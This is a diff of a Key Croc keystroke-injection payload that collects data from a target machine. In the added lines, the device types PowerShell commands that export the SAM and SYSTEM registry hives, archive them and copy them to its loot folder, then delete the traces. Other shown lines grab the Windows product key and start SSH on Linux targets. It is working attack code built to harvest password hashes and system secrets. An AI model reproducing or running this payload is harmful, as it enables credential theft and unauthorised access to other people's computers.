@@ -3,7 +3,7 @@
 #                This will collect some data off target (ip address, current user name, target host name, ssid and passwd, mac address)
 #                save to tools/Croc_pot folder
 # Author:        Spywill
-# Version:       1.4.4
+# Version:       1.4.5
 # Category:      Key Croc
 
 MATCH crocpot
@@ -113,19 +113,18 @@ WINDOWS)
 	Q STRING "(Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey | out-file -encoding UTF8 \"\$MOUNT_POINT\loot\Croc_Pot\Windows_ProductKey.txt\""
 	Q ENTER ; Q DELAY 3000
 	#---> Retrieve target registry hives
-	Q STRING "reg save HKLM\SAM \$MOUNT_POINT\loot\Croc_Pot\sam ; reg save HKLM\SYSTEM \$MOUNT_POINT\loot\Croc_Pot\system"
-	Q ENTER ; Q DELAY 5000
-	#---> sed to remove powershell output first "?" character, "\r" endlines, replace "-" with ":"
-	sed -i '0,/./s/^.//' ${CROC_POT_DIR[0]}/Croc_OS_Target.txt ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt ${CROC_POT_DIR[0]}/bunny_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt ${CROC_POT_DIR[0]}/NumLock.txt ${CROC_POT_DIR[0]}/target_email.txt
+	Q STRING "reg export HKEY_LOCAL_MACHINE\SAM (Join-Path -Path \$env:TEMP -ChildPath \"SAM.reg\"); reg export HKEY_LOCAL_MACHINE\SYSTEM (Join-Path -Path \$env:TEMP -ChildPath \"SYSTEM.reg\")"
+	Q ENTER ; Q DELAY 45000
+	Q STRING "Compress-Archive -Path (Join-Path -Path \$env:TEMP -ChildPath \"SAM.reg\"), (Join-Path -Path \$env:TEMP -ChildPath \"SYSTEM.reg\") -DestinationPath (Join-Path -Path \$env:TEMP -ChildPath \"registry_archive.zip\") -Force"
+	Q ENTER ; Q DELAY 35000
+	Q STRING "Move-Item -Path (Join-Path -Path \$env:TEMP -ChildPath \"registry_archive.zip\") -Destination (Join-Path -Path \$MOUNT_POINT -ChildPath \"\loot\Croc_Pot\registry_archive.zip\") -Force -ErrorAction SilentlyContinue"
+	Q ENTER ; Q DELAY 8000
+	Q STRING "Remove-Item -Path (Join-Path -Path \$env:TEMP -ChildPath \"SAM.reg\"), (Join-Path -Path \$env:TEMP -ChildPath \"SYSTEM.reg\")"
+	Q ENTER ; Q DELAY 2000
+	#---> sed to remove powershell output unreadable character, "\r" endlines, replace "-" with ":"
+	sed -i -e '1s/^[^[:print:]]*//' ${CROC_POT_DIR[0]}/Croc_OS_Target.txt ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt ${CROC_POT_DIR[0]}/bunny_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt ${CROC_POT_DIR[0]}/NumLock.txt ${CROC_POT_DIR[0]}/target_email.txt
 	sed -i 's/\r//g' ${CROC_POT_DIR[0]}/Croc_OS_Target.txt ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt ${CROC_POT_DIR[0]}/bunny_mac.txt ${CROC_POT_DIR[0]}/NumLock.txt ${CROC_POT_DIR[0]}/target_email.txt
 	sed -i 's/-/:/g' ${CROC_POT_DIR[0]}/shark_ip.txt ${CROC_POT_DIR[0]}/squirrel_mac.txt ${CROC_POT_DIR[0]}/turtle_mac.txt ${CROC_POT_DIR[0]}/bunny_mac.txt
-;;
-MACOS)
-	LED G ; Q DELAY 1000
-	#---> Start mac os terminal
-	Q GUI-SPACE ; Q DELAY 1000
-	Q STRING "terminal"
-	Q ENTER
 ;;
 LINUX)
 	LED B
@@ -332,7 +331,7 @@ elif [ "$TARGET_OS" = "LINUX" ]; then
 		Q ENTER ; Q DELAY 3000 ; Q STRING "q"
 	elif [ "$NMAP_SSH" = "closed" ] || [ "$NMAP_SSH" = "filtered" ]; then
 		Q STRING "sudo systemctl start ssh"
-		Q ENTER ; Q DELAY 3000 ; Q STRING "q"
+		Q ENTER ; Q DELAY 3000
 		Q STRING "sudo systemctl status sshd"
 		Q ENTER ; Q DELAY 3000 ; Q STRING "q"
 	else
